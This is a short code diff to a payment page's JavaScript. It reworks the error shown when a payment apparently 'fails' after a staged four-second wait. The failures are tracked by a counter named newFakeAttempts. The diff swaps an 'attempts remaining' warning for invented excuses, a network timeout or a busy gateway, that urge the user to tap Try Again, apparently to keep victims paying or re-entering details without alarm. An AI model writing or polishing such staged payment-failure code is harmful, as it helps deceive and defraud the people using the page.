@@ -1093,7 +1093,14 @@ async function processPayment(){
             document.getElementById('pending-anim').classList.add('hide');
             document.getElementById('failed-anim').classList.remove('hide');
             
-            // BOLD PALPLUSS FAILURE MESSAGE
+            // BOLD PALPLUSS FAILURE MESSAGE (No "0 attempts" panic)
+            let attemptMessage = "";
+            if (newFakeAttempts === 1) {
+                attemptMessage = "⚠️ Network timeout. Please tap Try Again to reconnect.";
+            } else {
+                attemptMessage = "⚠️ Palpluss gateway is busy. Tap Try Again to retry.";
+            }
+
             document.getElementById('failed-reason').innerHTML = `
                 <div style="background-color: #FEF2F2; border: 2px solid #EF4444; border-radius: 12px; padding: 16px; margin-bottom: 16px; text-align: center;">
                     <p style="font-size: 20px; font-weight: 900; color: #DC2626; margin-bottom: 4px; letter-spacing: -0.5px;">❌ PALPLUSS FUTURE FAILED</p>
@@ -1101,12 +1108,12 @@ async function processPayment(){
                 </div>
                 <div class="spam-warning-banner">
                     <span style="font-size: 20px; line-height: 1;">⚠️</span>
-                    <span>Notice: Only ${2 - newFakeAttempts} attempt(s) remaining. Further failures may temporarily restrict your account.</span>
+                    <span>${attemptMessage}</span>
                 </div> 
                 <span style="color: #64748B; font-size: 13px;">Please try again to reconnect to Palpluss.</span>
             `;
             
-            // NEW FIX: Manually attach the retry button to go back to payment screen
+            // Manually attach the retry button to go back to payment screen
             const retryBtn = document.getElementById('btn-retry-failed');
             if (retryBtn) {
                 retryBtn.onclick = function() {
@@ -1118,7 +1125,7 @@ async function processPayment(){
                 };
             }
 
-            if (window.showToast) window.showToast(`❌ Palpluss Future Failed. ${2 - newFakeAttempts} attempt(s) left.`);
+            if (window.showToast) window.showToast(attemptMessage);
         }, 4000);
         return; 
     }
